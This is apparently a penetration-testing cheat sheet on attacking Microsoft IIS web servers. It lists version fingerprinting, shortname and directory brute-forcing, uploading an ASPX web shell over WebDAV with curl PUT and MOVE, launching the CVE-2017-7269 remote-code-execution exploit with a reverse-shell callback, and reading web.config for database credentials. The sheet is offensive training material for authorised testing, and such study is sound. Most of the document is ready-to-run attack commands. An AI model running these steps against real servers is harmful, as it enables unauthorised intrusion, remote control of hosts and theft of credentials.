# IIS (Internet Information Services)

**What it is:** Microsoft's web server, bundled with Windows Server. Serves ASP, ASPX, and static content. Common on Windows-based targets and often found alongside Active Directory environments.

**Default ports:** 80, 443, 8080

**Vuln research:**
- [IIS CVEs — CVE Details](https://www.cvedetails.com/product/3436/Microsoft-IIS.html)
- [SearchSploit: `searchsploit iis`](https://www.exploit-db.com/search?q=iis)
- [HackTricks — IIS](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/iis-internet-information-services.html)

---

### Identify IIS version

Headers reveal version and OS — Determines attack surface

```bash
curl -sI http://$IP/ | grep -i server
nmap -sV -p 80,443 $IP
```

<details>
<summary>Example Output</summary>

```
Server: Microsoft-IIS/10.0
IIS 6.0 = Windows Server 2003 (very old, lots of exploits)
IIS 7.5 = Windows Server 2008 R2
IIS 8.5 = Windows Server 2012 R2
IIS 10.0 = Windows Server 2016/2019
```
</details>

---

### IIS shortname enumeration

Tilde (~) vulnerability — Reveal hidden file/directory names

```bash
# Use IIS-ShortName-Scanner:
java -jar iis_shortname_scanner.jar http://$IP/
# Or manual:
curl -sI "http://$IP/~1/.aspx" 
# 404 = exists, 400 = doesn't exist
```

---

### IIS WebDAV exploitation

If WebDAV is enabled — Upload files directly

```bash
davtest -url http://$IP/
cadaver http://$IP/
# Upload ASPX web shell:
curl -T shell.aspx http://$IP/shell.aspx
# If .aspx blocked, upload as .txt then MOVE:
curl -X MOVE -H "Destination: http://$IP/shell.aspx" http://$IP/shell.txt
```

---

### IIS 6.0 RCE (CVE-2017-7269)

Buffer overflow in WebDAV — Windows Server 2003 IIS 6.0

```bash
python2 iis6_exploit.py $IP 80 $LHOST 4444
# Or Metasploit:
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

---

### web.config for sensitive info

IIS configuration file — May contain credentials and connection strings

```bash
# Try to read via LFI or directory traversal:
curl http://$IP/web.config
# Common locations:
C:\inetpub\wwwroot\web.config
C:\web.config
```

<details>
<summary>Example Output</summary>

```xml
<connectionStrings>
  <add connectionString="Server=localhost;Database=mydb;User Id=sa;Password=SuperSecret123;" />
</connectionStrings>
```
</details>

---

### Default IIS files and directories

Check for information disclosure

```bash
# Files:
/iisstart.htm          # Default page
/aspnet_client/        # ASP.NET client files
/web.config            # Configuration
/_vti_bin/             # FrontPage extensions
/_vti_inf.html         # FrontPage version info

# Brute force:
gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,config,txt
```

---
